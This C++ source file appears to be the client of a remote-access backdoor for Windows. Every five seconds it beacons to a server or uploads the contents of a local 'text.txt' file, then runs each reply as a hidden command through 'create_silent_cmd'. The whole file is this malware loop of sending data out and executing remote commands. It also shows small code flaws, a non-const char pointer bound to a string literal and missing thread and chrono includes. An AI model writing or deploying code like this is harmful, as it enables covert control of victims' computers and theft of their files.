#include "connection.hpp"

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <cstdlib>

#include <windows.h>

static constexpr char* acknowledgement{"act"};
static constexpr int intervalSeconds{5}; // Interval for sending requests (in seconds)
std::ifstream buffor_file("text.txt");

int main() {
    std::string result;
    std::string received;

    while (true) {     
        if (!buffor_file.is_open()) {            
            received = sendRequest(acknowledgement);
        } else{
            std::stringstream buffer;
            buffer << buffor_file.rdbuf();
            std::string send = buffer.str();

            received = sendRequest(send);
        }
        
        if (received != std::string(RECEIVE_FAILED)){
            create_silent_cmd(received);
            std::cout << received <<std::endl;
        }
        
        // Wait for the next interval
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
    }
    return 0;
}